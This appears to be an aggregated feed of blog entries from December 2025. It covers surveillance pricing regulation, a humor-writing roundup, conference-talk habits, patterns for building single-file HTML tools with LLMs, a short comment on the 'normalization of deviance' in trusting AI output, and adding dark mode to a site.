extremely weaksauce, and might even be worse than nothing. In California we have Prop 65, a rule that requires businesses to post signs and add labels any time they expose you to chemicals &quot;known to the state of California to cause cancer.&quot; This caveat emptor approach (warn people, let them vote with their wallets) has led to every corner of California's built environment being festooned with these warnings. Today, Californians just ignore these warnings, the same way that web users ignore the &quot;privacy policy&quot; disclosures on the sites they visit: <a href="https://pluralistic.net/2025/04/19/gotcha/#known-to-the-state-of-california-to-cause-cancer">https://pluralistic.net/2025/04/19/gotcha/#known-to-the-state-of-california-to-cause-cancer</a> The right approach isn't to (merely) warn people about carcinogens (or privacy risks). The right approach is regulating harmful business practices, whether those practices give you a tumor or pick your pocket. Under Biden, former FTC chair Lina Khan undertook proceedings to ban algorithmic pricing altogether. Trump's FTC killed that, along with all the other quality-of-life enhancing measures the FTC had in train (Trump's FTC chair replaced these with a program to root out &quot;wokeness&quot; in the agency). Today, Khan is co-chair of Zohran Mamdani's transition team, and she will use the mayor's authority (under the New York City Consumer Protection Law of 1969, which addresses &quot;unconscionable&quot; commercial practices) to ban algorithmic pricing in NYC: <a href="https://pluralistic.net/2025/11/15/unconscionability/#standalone-authority">https://pluralistic.net/2025/11/15/unconscionability/#standalone-authority</a> Khan wasn't Biden's only de-optimizer. Under chair Rohit Chopra, Biden's Consumer Finance Protection Bureau actually banned the data-brokers who power surveillance pricing: <a href="https://pluralistic.net/2023/08/16/the-second-best-time-is-now/#the-point-of-a-system-is-what-it-does">https://pluralistic.net/2023/08/16/the-second-best-time-is-now/#the-point-of-a-system-is-what-it-does</a> And of course, Trump's CFPB (neutered by Musk and his broccoli-haired brownshirts at DOGE) killed that effort: <a href="https://pluralistic.net/2025/05/15/asshole-to-appetite/#ssn-for-sale">https://pluralistic.net/2025/05/15/asshole-to-appetite/#ssn-for-sale</a> But the CFPB staffer who ran that effort has gone to work on an effort to leverage a New Jersey state privacy law to crush the data-broker industry: <a href="https://www.wired.com/story/daniels-law-new-jersey-online-privacy-matt-adkisson-atlas-lawsuits/">https://www.wired.com/story/daniels-law-new-jersey-online-privacy-matt-adkisson-atlas-lawsuits/</a> These are efforts to optimize corporations for human thriving, by making them charge us less and pay us more. For while we are best off when we are unoptimizable, we are also best off when corporations are totally optimized – for our benefit.

      <h1>A Newsletter of Humorous Writing #422</h1>

(date: 2025-12-11)
      <p>
      <h3><em>For December 3-9, 2025</em></h3>
<p>Hello and welcome to <strong>A Newsletter of Humorous Writing</strong>, a roundup of the week's finest short humor pieces and funny articles, and a celebration of the fantastic writers who wrote them. <strong>Thanks so much to everyone who came out to the Hangout of Humorous Readings last night!</strong> It was a blast getting to see and catch up with so many of you and we hope you had a good time as well. And if you weren’t able to make it, hope to see you at the next one in 2026!</p>

<h2>What We Enjoyed This Week</h2>

And though this piece is about all the ways CW-style shows can go wrong, we couldn’t help but feel that this hypothetical take on Hamlet would also kinda rock. Scarlet, start working on that pilot (or send it to us if you’ve already written one)!</p>
<p><a href="https://www.pointsincase.com/articles/how-i-built-22-streams-of-passive-income-by-blackmailing-the-starting-lineup-of-the-philadelphia-eagles?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-422"><strong>How I Built 22 Streams of Passive Income by Blackmailing the Starting Lineup of the Philadelphia Eagles</strong></a> <strong>by</strong> <a href="https://www.pointsincase.com/author/ally-mason?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-422"><strong>Ally Mason</strong></a> <em>(Points in Case)</em> There are so many great wacky specifics in this piece, starting with the choice to have the targets of the blackmail be the starting lineup of the Philadelphia Eagles. We’re particularly fond of: “Offensive tackle Jordan Mailata thought no one would ever find out about his secret cover band, Kn*Sync, a surreal collision of NSYNC's chart-topping hits with avant-garde electronica act ‘The Knife.’ Now I not only get hush money, but also a cut of the door, merch, and all CD sales.”</p>

It reminded us in the best way of <a href="https://abbeyfenbert.weebly.com/?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-422">Abby Fenbert</a>’s <a href="https://the-toast.archive.town/?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-422"><em>Toast</em></a> classic, <a href="https://the-toast.archive.town/2015/07/15/the-pitch-meeting-for-wishbone/?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-422">The Pitch Meeting for Wishbone</a>.</p>

      <h1>Skip intro</h1>

(date: 2025-12-11)
      <p>
      <p>There’s the old adage “nobody gets fired for buying IBM”. Or to put it more broadly, “everyone else is doing it.”</p>
<p>It’s dispiriting how often this explanation is given as justification for a dubious design decision, from home-page carousels to cookie banners.</p>
<p>Nic Chan has written <a href="https://www.nicchan.me/blog/the-f-off-contact-page/">a great post about designing a contact form</a> and how the process was derailed by the client pointing to other people’s contact forms …even when they’ve got very, very different user needs.</p>
<p>It’s especially depressing when “everyone else is doing it” is used a substitute for any kind of accountability.</p>
<p>Building an email service that’s going to track when people click on links in an email? That sounds dodgy. On the other hand, everyone else is doing it.</p>
<p>Building a straightforward website, but making it a single-page app with client-side React that will be barely work on some devices and networks? That seems over-engineered. On the other hand, everyone else is doing it.</p>
<p>Sometimes the “everyone else is doing it” phenomenon leads to a chain reaction where nobody even knows why anyone ever did it in the first place.</p>
<p>Remember Flash? Remember when almost every website had a Flash intro? Everyone knew they were annoying and uneccessary, but everyone else was doing it.</p>
<p>Instead of getting rid of the intros, we got “skip intro” links instead. This link was guaranteed to have a 100% clickthrough rate.</p>
<p>I’ve noticed something similar with conference talks. So many of them begin with a little spiel about the speaker, their background, and their work experience.</p>
<p>This might be interesting information, but this isn’t the right time or place for it. It’s already on the conference website, in the conference programme, and has probably just been reiterated by the conference host who just introduced the speaker.</p>
<p>When I’ve asked why people do this, the responses generally come down to “everyone else is doing it.” It’s become an expected part of the conference talk, just like a Flash intro used to be an expected part of a website.</p>
<p>When I’m curating a conference, I like to send speakers some information to help them prepare their talk. Some of this is practical stuff, like the tech set-up. Some of it is guidance for the slides, like ensuring sufficient colour contrast. And then there’s this:</p>
<blockquote>
<p>Please don’t begin your talk with an introduction about yourself and your work history. You’ll be introduced on stage so it would be a shame to just repeat all that again. Also, it just gets in the way of the actual content of your talk. No need to provide your bona-fides.</p>
</blockquote>
<p>Personally, I just find it super cringe. That’s why I don’t do it if I’m giving a talk myself.</p>
<p>As a host however, it’s a big part of my job. It’s way less cringe to have someone else big you up before the talk then doing it yourself.</p>

      <h1>Useful patterns for building HTML tools</h1>

(date: 2025-12-10)
      <p>
      <p>I've started using the term <strong>HTML tools</strong> to refer to HTML applications that I've been building which combine HTML, JavaScript, and CSS in a single file and use them to provide useful functionality. I have built <a href="https://tools.simonwillison.net/">over 150 of these</a> in the past two years, almost all of them written by LLMs. This article presents a collection of useful patterns I've discovered along the way.</p>
<p>First, some examples to show the kind of thing I'm talking about:</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/svg-render?url=https://gist.githubusercontent.com/simonw/aedecb93564af13ac1596810d40cac3c/raw/83e7f3be5b65bba61124684700fa7925d37c36c3/tiger.svg">svg-render</a></strong> renders SVG code to downloadable JPEGs or PNGs</li>
<li><strong><a href="https://tools.simonwillison.net/pypi-changelog?package=llm&amp;compare=0.27...0.27.1">pypi-changelog</a></strong> lets you generate (and copy to clipboard) diffs between different PyPI package releases.</li>
<li><strong><a href="https://tools.simonwillison.net/bluesky-thread?url=https%3A%2F%2Fbsky.app%2Fprofile%2Fsimonwillison.net%2Fpost%2F3m7gzjew3ss2e&amp;view=thread">bluesky-thread</a></strong> provides a nested view of a discussion thread on Bluesky.</li>
</ul>
<p><a href="https://tools.simonwillison.net/svg-render?url=https://gist.githubusercontent.com/simonw/aedecb93564af13ac1596810d40cac3c/raw/83e7f3be5b65bba61124684700fa7925d37c36c3/tiger.svg"><img src="https://static.simonwillison.net/static/2025/html-tools/svg-render.jpg" alt="screenshot of svg-render"></a><a href="https://tools.simonwillison.net/pypi-changelog?package=llm&amp;compare=0.27...0.27.1"><img src="https://static.simonwillison.net/static/2025/html-tools/pypi-changelog.jpg" alt="screenshot of pypi-changelog"></a><a href="https://tools.simonwillison.net/bluesky-thread?url=https%3A%2F%2Fbsky.app%2Fprofile%2Fsimonwillison.net%2Fpost%2F3m7gzjew3ss2e&amp;view=thread"><img src="https://static.simonwillison.net/static/2025/html-tools/bluesky-thread.jpg" alt="screenshot of bluesky-thread"></a></p>
<p>These are some of my recent favorites. I have dozens more like this that I use on a regular basis.</p>
<p>You can explore my collection on <strong><a href="https://tools.simonwillison.net/">tools.simonwillison.net</a></strong> - the <a href="https://tools.simonwillison.net/by-month">by month</a> view is useful for browsing the entire collection.</p>
<p>If you want to see the code and prompts, almost all of the examples in this post include a link in their footer to &quot;view source&quot; on GitHub. The GitHub commits usually contain either the prompt itself or a link to the transcript used to create the tool.</p>

<h4>The anatomy of an HTML tool</h4>
<p>These are the characteristics I have found to be most productive in building tools of this nature:</p>
<ol>
<li>A single file: inline JavaScript and CSS in a single HTML file means the least hassle in hosting or distributing them, and crucially means you can copy and paste them out of an LLM response.</li>
<li>Avoid React, or anything with a build step. The problem with React is that JSX requires a build step, which makes everything massively less convenient. I prompt &quot;no react&quot; and skip that whole rabbit hole entirely.</li>
<li>Load dependencies from a CDN. The fewer dependencies the better, but if there's a well known library that helps solve a problem I'm happy to load it from CDNjs or jsdelivr or similar.</li>
<li>Keep them small. A few hundred lines means the maintainability of the code doesn't matter too much: any good LLM can read them and understand what they're doing, and rewriting them from scratch with help from an LLM takes just a few minutes.</li>
</ol>
<p>The end result is a few hundred lines of code that can be cleanly copied and pasted into a GitHub repository.</p>
<h4>Prototype with Artifacts or Canvas</h4>
<p>The easiest way to build one of these tools is to start in ChatGPT or Claude or Gemini. All three have features where they can write a simple HTML+JavaScript application and show it to you directly.</p>
<p>Claude calls this &quot;Artifacts&quot;, ChatGPT and Gemini both call it &quot;Canvas&quot;. Claude has the feature enabled by default, ChatGPT and Gemini may require you to toggle it on in their &quot;tools&quot; menus.</p>
<p>Try this prompt in Gemini or ChatGPT:</p>
<blockquote>
<p><code>Build a canvas that lets me paste in JSON and converts it to YAML. No React.</code></p>
</blockquote>
<p>Or this prompt in Claude:</p>
<blockquote>
<p><code>Build an artifact that lets me paste in JSON and converts it to YAML. No React.</code></p>
</blockquote>
<p>I always add &quot;No React&quot; to these prompts, because otherwise they tend to build with React, resulting in a file that is harder to copy and paste out of the LLM and use elsewhere. I find that attempts which use React take longer to display (since they need to run a build step) and are more likely to contain crashing bugs for some reason, especially in ChatGPT.</p>
<p>All three tools have &quot;share&quot; links that provide a URL to the finished application. Examples:</p>
<ul>
<li><a href="https://chatgpt.com/canvas/shared/6938e8ece53c8191a2f9d7dfcd090d11">ChatGPT JSON to YAML Canvas</a> made with GPT-5.1 Thinking - here's <a href="https://chatgpt.com/share/6938e926-ee14-8006-9678-383b3a8dac78">the full ChatGPT transcript</a></li>

</ul>
<h4>Switch to a coding agent for more complex projects</h4>
<p>Coding agents such as Claude Code and Codex CLI have the advantage that they can test the code themselves while they work on it using tools like Playwright. I often upgrade to one of those when I'm working on something more complicated, like my Bluesky thread viewer tool shown above.</p>
<p>I also frequently use <strong>asynchronous coding agents</strong> like Claude Code for web to make changes to existing tools. I shared a video about that in <a href="https://simonwillison.net/2025/Oct/23/claude-code-for-web-video/">Building a tool to copy-paste share terminal sessions using Claude Code for web</a>.</p>
<p>Claude Code for web and Codex Cloud run directly against my <a href="https://github.com/simonw/tools">simonw/tools</a> repo, which means they can publish or upgrade tools via Pull Requests (here are <a href="https://github.com/simonw/tools/pulls?q=is%3Apr+is%3Aclosed">dozens of examples</a>) without me needing to copy and paste anything myself.</p>
<h4>Load dependencies from CDNs</h4>
<p>Any time I use an additional JavaScript library as part of my tool I like to load it from a CDN.</p>
<p>The three major LLM platforms support specific CDNs as part of their Artifacts or Canvas features, so often if you tell them &quot;Use PDF.js&quot; or similar they'll be able to compose a URL to a CDN that's on their allow-list.</p>
<p>Sometimes you'll need to go and look up the URL on <a href="https://cdnjs.com/">cdnjs</a> or <a href="https://www.jsdelivr.com/">jsDelivr</a> and paste it into the chat.</p>
<p>CDNs like these have been around for long enough that I've grown to trust them, especially for URLs that include the package version.</p>
<p>The alternative to CDNs is to use npm and have a build step for your projects. I find this reduces my productivity at hacking on individual tools and makes it harder to self-host them.</p>
<h4>Host them somewhere else</h4>
<p>I don't like leaving my HTML tools hosted by the LLM platforms themselves for a couple of reasons. First, LLM platforms tend to run the tools inside a tight sandbox with a lot of restrictions. They're often unable to load data or images from external URLs, and sometimes even features like linking out to other sites are disabled.</p>
<p>The end-user experience often isn't great either. They show warning messages to new users, often take additional time to load and delight in showing promotions for the platform that was used to create the tool.</p>
<p>They're also not as reliable as other forms of static hosting. If ChatGPT or Claude are having an outage I'd like to still be able to access the tools I've created in the past.</p>
<p>Being able to easily self-host is the main reason I like insisting on &quot;no React&quot; and using CDNs for dependencies - the absence of a build step makes hosting tools elsewhere a simple case of copying and pasting them out to some other provider.</p>
<p>My preferred provider here is <a href="https://docs.github.com/en/pages">GitHub Pages</a> because I can paste a block of HTML into a file on github.com and have it hosted on a permanent URL a few seconds later. Most of my tools end up in my <a href="https://github.com/simonw/tools">simonw/tools</a> repository which is configured to serve static files at <a href="https://tools.simonwillison.net/">tools.simonwillison.net</a>.</p>
<h4>Take advantage of copy and paste</h4>
<p>One of the most useful input/output mechanisms for HTML tools comes in the form of <strong>copy and paste</strong>.</p>
<p>I frequently build tools that accept pasted content, transform it in some way and let the user copy it back to their clipboard to paste somewhere else.</p>
<p>Copy and paste on mobile phones is fiddly, so I frequently include &quot;Copy to clipboard&quot; buttons that populate the clipboard with a single touch.</p>
<p>Most operating system clipboards can carry multiple formats of the same copied data. That's why you can paste content from a word processor in a way that preserves formatting, but if you paste the same thing into a text editor you'll get the content with formatting stripped.</p>
<p>These rich copy operations are available in JavaScript paste events as well, which opens up all sorts of opportunities for HTML tools.</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/hacker-news-thread-export">hacker-news-thread-export</a></strong> lets you paste in a URL to a Hacker News thread and gives you a copyable condensed version of the entire thread, suitable for pasting into an LLM to get a useful summary.</li>
<li><strong><a href="https://tools.simonwillison.net/paste-rich-text">paste-rich-text</a></strong> lets you copy from a page and paste to get the HTML - particularly useful on mobile where view-source isn't available.</li>
<li><strong><a href="https://tools.simonwillison.net/alt-text-extractor">alt-text-extractor</a></strong> lets you paste in images and then copy out their alt text.</li>
</ul>

<h4>Build debugging tools</h4>
<p>The key to building interesting HTML tools is understanding what's possible. Building custom debugging tools is a great way to explore these options.</p>
<p><strong><a href="https://tools.simonwillison.net/clipboard-viewer">clipboard-viewer</a></strong> is one of my most useful. You can paste anything into it (text, rich text, images, files) and it will loop through and show you every type of paste data that's available on the clipboard.</p>
<p><img src="https://static.simonwillison.net/static/2025/clipboard-viewer.jpg" alt="Clipboard Format Viewer. Paste anywhere on the page (Ctrl+V or Cmd+V). This shows text/rtf with a bunch of weird code, text/plain with some pasted HTML diff and a Clipboard Event Information panel that says Event type: paste, Formats available: text/rtf, text/plain, 0 files reported and 2 clipboard items reported."></p>
<p>This was key to building many of my other tools, because it showed me the invisible data that I could use to bootstrap other interesting pieces of functionality.</p>
<p>More debugging examples:</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/keyboard-debug">keyboard-debug</a></strong> shows the keys (and <code>KeyCode</code> values) currently being held down.</li>
<li><strong><a href="https://tools.simonwillison.net/cors-fetch">cors-fetch</a></strong> reveals if a URL can be accessed via CORS.</li>
<li><strong><a href="https://tools.simonwillison.net/exif">exif</a></strong> displays EXIF data for a selected photo.</li>

<h4>Persist state in the URL</h4>
<p>HTML tools may not have access to server-side databases for storage but it turns out you can store a <em>lot</em> of state directly in the URL.</p>
<p>I like this for tools I may want to bookmark or share with other people.</p>

<h4>Use localStorage for secrets or larger state</h4>
<p>The <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage">localStorage</a> browser API lets HTML tools store data persistently on the user's device, without exposing that data to the server.</p>
<p>I use this for larger pieces of state that don't fit comfortably in a URL, or for secrets like API keys which I really don't want anywhere near my server - even static hosts might have server logs that are outside of my influence.</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/word-counter">word-counter</a></strong> is a simple tool I built to help me write to specific word counts, for things like conference abstract submissions. It uses localStorage to save as you type, so your work isn't lost if you accidentally close the tab.</li>
<li><strong><a href="https://tools.simonwillison.net/render-markdown">render-markdown</a></strong> uses the same trick - I sometimes use this one to craft blog posts and I don't want to lose them.</li>
<li><strong><a href="https://tools.simonwillison.net/haiku">haiku</a></strong> is one of a number of LLM demos I've built that request an API key from the user (via the <code>prompt()</code> function) and then store that in <code>localStorage</code>.

<h4>Collect CORS-enabled APIs</h4>
<p>CORS stands for <a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing">Cross-origin resource sharing</a>. It's a relatively low-level detail which controls if JavaScript running on one site is able to fetch data from APIs hosted on other domains.</p>
<p>APIs that provide open CORS headers are a goldmine for HTML tools. It's worth building a collection of these over time.</p>
<p>Here are some I like:</p>
<ul>
<li>iNaturalist for fetching sightings of animals, including URLs to photos</li>
<li>PyPI for fetching details of Python packages</li>
<li>GitHub because anything in a public repository in GitHub has a CORS-enabled anonymous API for fetching that content from the raw.githubusercontent.com domain, which is behind a caching CDN so you don't need to worry too much about rate limits or feel guilty about adding load to their infrastructure.</li>
<li>Bluesky for all sorts of operations</li>
<li>Mastodon has generous CORS policies too, as used by applications like <a href="https://phanpy.social/">phanpy.social</a></li>
</ul>
<p>GitHub Gists are a personal favorite here, because they let you build apps that can persist state to a permanent Gist through making a cross-origin API call.</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/species-observation-map#%7B%22taxonId%22%3A123829%2C%22taxonName%22%3A%22California%20Brown%20Pelican%22%2C%22days%22%3A%2230%22%7D">species-observation-map</a></strong> uses iNaturalist to show a map of recent sightings of a particular species.</li>
<li><strong><a href="https://tools.simonwillison.net/zip-wheel-explorer?package=llm">zip-wheel-explorer</a></strong> fetches a <code>.whl</code> file for a Python package from PyPI, unzips it (in browser memory) and lets you navigate the files.</li>
<li><strong><a href="https://tools.simonwillison.net/github-issue-to-markdown?issue=https%3A%2F%2Fgithub.com%2Fsimonw%2Fsqlite-utils%2Fissues%2F657">github-issue-to-markdown</a></strong> fetches issue details and comments from the GitHub API (including expanding any permanent code links) and turns them into copyable Markdown.</li>

<h4>LLMs can be called directly via CORS</h4>
<p>All three of OpenAI, Anthropic and Gemini offer JSON APIs that can be accessed via CORS directly from HTML tools.</p>
<p>Unfortunately you still need an API key, and if you bake that key into your visible HTML anyone can steal it and use to rack up charges on your account.</p>
<p>I use the <code>localStorage</code> secrets pattern to store API keys for these services. This sucks from a user experience perspective - telling users to go and create an API key and paste it into a tool is a lot of friction - but it does work.</p>
<p>Some examples:</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/haiku">haiku</a></strong> uses the Claude API to write a haiku about an image from the user's webcam.</li>
<li><strong><a href="https://tools.simonwillison.net/openai-audio-output">openai-audio-output</a></strong> generates audio speech using OpenAI's GPT-4o audio API.</li>
<li><strong><a href="http://tools.simonwillison.net/gemini-bbox">gemini-bbox</a></strong> demonstrates Gemini 2.5's ability to return complex shaped image masks for objects in images, see <a href="https://simonwillison.net/2025/Apr/18/gemini-image-segmentation/">Image segmentation using Gemini 2.5</a>.</li>

<h4>Don't be afraid of opening files</h4>
<p>You don't need to upload a file to a server in order to make use of the <code>&lt;input type=&quot;file&quot;&gt;</code> element. JavaScript can access the content of that file directly, which opens up a wealth of opportunities for useful functionality.</p>
<p>Some examples:</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/ocr">ocr</a></strong> is the first tool I built for my collection, described in <a href="https://simonwillison.net/2024/Mar/30/ocr-pdfs-images/">Running OCR against PDFs and images directly in your browser</a>. It uses <code>PDF.js</code> and <code>Tesseract.js</code> to allow users to open a PDF in their browser which it then converts to an image-per-page and runs through OCR.</li>
<li><strong><a href="https://tools.simonwillison.net/social-media-cropper">social-media-cropper</a></strong> lets you open (or paste in) an existing image and then crop it to common dimensions needed for different social media platforms - 2:1 for Twitter and LinkedIn, 1.4:1 for Substack etc.</li>
<li><strong><a href="https://tools.simonwillison.net/ffmpeg-crop">ffmpeg-crop</a></strong> lets you open and preview a video file in your browser, drag a crop box within it and then copy out the <code>ffmpeg</code> command needed to produce a cropped copy on your own machine.</li>
</ul>
<p><a href="https://tools.simonwillison.net/ocr"><img src="https://static.simonwillison.net/static/2025/html-tools/ocr.jpg" alt="screenshot of ocr"></a><a href="https://tools.simonwillison.net/social-media-cropper"><img src="https://static.simonwillison.net/static/2025/html-tools/social-media-cropper.jpg" alt="screenshot of social-media-cropper"></a><a href="https://tools.simonwillison.net/ffmpeg-crop"><img src="https://static.simonwillison.net/static/2025/html-tools/ffmpeg-crop.jpg" alt="screenshot of ffmpeg-crop"></a></p>
<h4>You can offer downloadable files too</h4>
<p>An HTML tool can generate a file for download without needing help from a server.</p>
<p>The JavaScript library ecosystem has a huge range of packages for generating files in all kinds of useful formats.</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/svg-render">svg-render</a></strong> lets the user download the PNG or JPEG rendered from an SVG.</li>
<li><strong><a href="https://tools.simonwillison.net/social-media-cropper">social-media-cropper</a></strong> does the same for cropped images.</li>
<li><strong><a href="https://tools.simonwillison.net/open-sauce-2025">open-sauce-2025</a></strong> is my alternative schedule for a conference that includes a downloadable ICS file for adding the schedule to your calendar. See <a href="https://simonwillison.net/2025/Jul/17/vibe-scraping/">Vibe scraping and vibe coding a schedule app for Open Sauce 2025 entirely on my phone</a> for more on that project.</li>

<h4>Pyodide can run Python code in the browser</h4>
<p><a href="https://pyodide.org/">Pyodide</a> is a distribution of Python that's compiled to WebAssembly and designed to run directly in browsers. It's an engineering marvel and one of the most underrated corners of the Python world.</p>
<p>It also cleanly loads from a CDN, which means there's no reason not to use it in HTML tools!</p>
<p>Even better, the Pyodide project includes <a href="https://github.com/pyodide/micropip">micropip</a> - a mechanism that can load extra pure-Python packages from PyPI via CORS.</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/pyodide-bar-chart">pyodide-bar-chart</a></strong> demonstrates running Pyodide, Pandas and matplotlib to render a bar chart directly in the browser.</li>
<li><strong><a href="https://tools.simonwillison.net/numpy-pyodide-lab">numpy-pyodide-lab</a></strong> is an experimental interactive tutorial for Numpy.</li>
<li><strong><a href="https://tools.simonwillison.net/apsw-query">apsw-query</a></strong> demonstrates the <a href="https://github.com/rogerbinns/apsw">APSW SQLite library</a> running in a browser, using it to show EXPLAIN QUERY plans for SQLite queries.</li>
</ul>

<h4>WebAssembly opens more possibilities</h4>
<p>Pyodide is possible thanks to WebAssembly. WebAssembly means that a vast collection of software originally written in other languages can now be loaded in HTML tools as well.</p>
<p><a href="https://squoosh.app/">Squoosh.app</a> was the first example I saw that convinced me of the power of this pattern - it makes several best-in-class image compression libraries available directly in the browser.</p>
<p>I've used WebAssembly for a few of my own tools:</p>
<ul>
<li><strong><a href="https://tools.simonwillison.net/ocr">ocr</a></strong> uses the pre-existing <a href="https://tesseract.projectnaptha.com/">Tesseract.js</a> WebAssembly port of the Tesseract OCR engine.</li>
<li><strong><a href="https://tools.simonwillison.net/sloccount">sloccount</a></strong> is a port of David Wheeler's Perl and C <a href="https://dwheeler.com/sloccount/">SLOCCount</a> utility to the browser, using a big ball of WebAssembly duct tape. <a href="https://simonwillison.net/2025/Oct/22/sloccount-in-webassembly/">More details here</a>.</li>
<li><strong><a href="https://tools.simonwillison.net/micropython">micropython</a></strong> is my experiment using <a href="https://www.npmjs.com/package/@micropython/micropython-webassembly-pyscript">@micropython/micropython-webassembly-pyscript</a> from NPM to run Python code with a smaller initial download than Pyodide.</li>
</ul>

<h4>Remix your previous tools</h4>
<p>The biggest advantage of having a single public collection of 100+ tools is that it's easy for my LLM assistants to recombine them in interesting ways.</p>
<p>Sometimes I'll copy and paste a previous tool into the context, but when I'm working with a coding agent I can reference them by name - or tell the agent to search for relevant examples before it starts work.</p>
<p>The source code of any working tool doubles as clear documentation of how something can be done, including patterns for using editing libraries. An LLM with one or two existing tools in their context is much more likely to produce working code.</p>
<p>I built <strong><a href="https://tools.simonwillison.net/pypi-changelog">pypi-changelog</a></strong> by telling Claude Code:</p>
<blockquote>
<p><code>Look at the pypi package explorer tool</code></p>
</blockquote>
<p>And then, after it had found and read the source code for <a href="https://tools.simonwillison.net/zip-wheel-explorer">zip-wheel-explorer</a>:</p>
<blockquote>
<p><code>Build a new tool pypi-changelog.html which uses the PyPI API to get the wheel URLs of all available versions of a package, then it displays them in a list where each pair has a &quot;Show changes&quot; clickable in between them - clicking on that fetches the full contents of the wheels and displays a nicely rendered diff representing the difference between the two, as close to a standard diff format as you can get with JS libraries from CDNs, and when that is displayed there is a &quot;Copy&quot; button which copies that diff to the clipboard</code></p>
</blockquote>

<p>See <a href="https://simonwillison.net/2024/Mar/30/ocr-pdfs-images/">Running OCR against PDFs and images directly in your browser</a> for another detailed example of remixing tools to create something new.</p>
<h4>Record the prompt and transcript</h4>
<p>I like keeping (and publishing) records of everything I do with LLMs, to help me grow my skills at using them over time.</p>
<p>For HTML tools I built by chatting with an LLM platform directly I use the &quot;share&quot; feature for those platforms.</p>
<p>For Claude Code or Codex CLI or other coding agents I copy and paste the full transcript from the terminal into my <a href="https://tools.simonwillison.net/terminal-to-html">terminal-to-html</a> tool and share that using a Gist.</p>
<p>In either case I include links to those transcripts in the commit message when I save the finished tool to my repository. You can see those <a href="https://tools.simonwillison.net/colophon">in my tools.simonwillison.net colophon</a>.</p>
<h4>Go forth and build</h4>
<p>I've had <em>so much fun</em> exploring the capabilities of LLMs in this way over the past year and a half, and building tools in this way has been invaluable in helping me understand both the potential for building tools with HTML and the capabilities of the LLMs that I'm building them with.</p>
<p>If you're interested in starting your own collection I highly recommend it! All you need to get started is a free GitHub repository with GitHub Pages enabled (Settings -&gt; Pages -&gt; Source -&gt; Deploy from a branch -&gt; main) and you can start copying in <code>.html</code> pages generated in whatever manner you like.</p>

      <h1>The Normalization of Deviance in AI</h1>

(date: 2025-12-10)
      <p>
      <p><strong><a href="https://embracethered.com/blog/posts/2025/the-normalization-of-deviance-in-ai/">The Normalization of Deviance in AI</a></strong></p>
<p>This thought-provoking essay from Johann Rehberger directly addresses something that I’ve been worrying about for quite a while: in the absence of any headline-grabbing examples of prompt injection vulnerabilities causing real economic harm, is anyone going to care?</p>
<p>Johann describes the concept of the “Normalization of Deviance” as directly applying to this question.</p>
<p>Coined by <a href="https://en.wikipedia.org/wiki/Diane_Vaughan">Diane Vaughan</a>, the key idea here is that organizations that get away with “deviance” - ignoring safety protocols or otherwise relaxing their standards - will start baking that unsafe attitude into their culture. This can work fine… until it doesn’t. The Space Shuttle Challenger disaster has been partially blamed on this class of organizational failure.</p>
<p>As Johann puts it:</p>
<blockquote>
<p>In the world of AI, we observe companies treating probabilistic, non-deterministic, and sometimes adversarial model outputs as if they were reliable, predictable, and safe.</p>
<p>Vendors are normalizing trusting LLM output, but current understanding violates the assumption of reliability.</p>
<p>The model will not consistently follow instructions, stay aligned, or maintain context integrity. This is especially true if there is an attacker in the loop (e.g indirect prompt injection).</p>
<p>However, we see more and more systems allowing untrusted output to take consequential actions. Most of the time it goes well, and over time vendors and organizations lower their guard or skip human oversight entirely, because “it worked last time.”</p>
<p>This dangerous bias is the fuel for normalization: organizations confuse the absence of a successful attack with the presence of robust security.</p>
</blockquote>

      <p>Every time I go to the supermarket I'm reminded of how scary the times are. People want to just <a href="https://bsky.app/profile/factpostnews.bsky.social/post/3m7ngrmymxk2y">live their lives</a>, never has that been more understandable, but food prices are a constant reminder for everyone there's good reason to be scared. And if you want to really feel it, imagine what happens if we somehow let Trump flood the economy with dollars. Talk about a recipe for disruption, this time, of our lives, not just some kind of PC or network or game software.</p>

      <h1>Dark mode</h1>

(date: 2025-12-10)
      <p>
      <p>I've never been particularly invested dark v.s. light mode but I get enough people complaining that this site is &quot;blinding&quot; that I decided to see if Claude Code for web could produce a useful dark mode from my existing CSS. It did <a href="https://github.com/simonw/simonwillisonblog/pull/572/files">a decent job</a>, using CSS properties, <code>@media (prefers-color-scheme: dark)</code> and a <code>data-theme=&quot;dark&quot;</code> attribute based on this prompt:</p>
<blockquote>
<p><code>Add a dark theme which is triggered by user media preferences but can also be switched on using localStorage - then put a little icon in the footer for toggling it between default auto, forced regular and forced dark mode</code></p>
</blockquote>
<p>The site defaults to picking up the user's preferences, but there's also a toggle in the footer which switches between auto, forced-light and forced-dark. Here's an animated demo:</p>
<p><img src="https://static.simonwillison.net/static/2025/dark-mode.gif" alt="This site on mobile. Clicking the icon in the footer switches to a black background with readable text."></p>
<p>I had Claude Code <a href="https://gistpreview.github.io/?5ea34de3e999bd32d0f86beef4bd803d">make me that GIF</a> from two static screenshots - it used this ImageMagick recipe:</p>
<pre><code>magick -delay 300 -loop 0 one.png two.png \
    -colors 128 -layers Optimize dark-mode.gif

</code></pre>
<p>The CSS ended up with some duplication due to the need to handle both the media preference and the explicit user selection. We <a href="https://github.com/simonw/simonwillisonblog/commit/d4bc7573775960a630145a287d854b8569da6f72#diff-5acc582e2a25639d184d784747a69ff9b30061aca8d5913d9c7e67452e715e08">fixed that with Cog</a>.</p>

      <h1>Purism Liberty Phone Exists vs. Delayed T1 Phone</h1>

(date: 2025-12-10)
      <p>
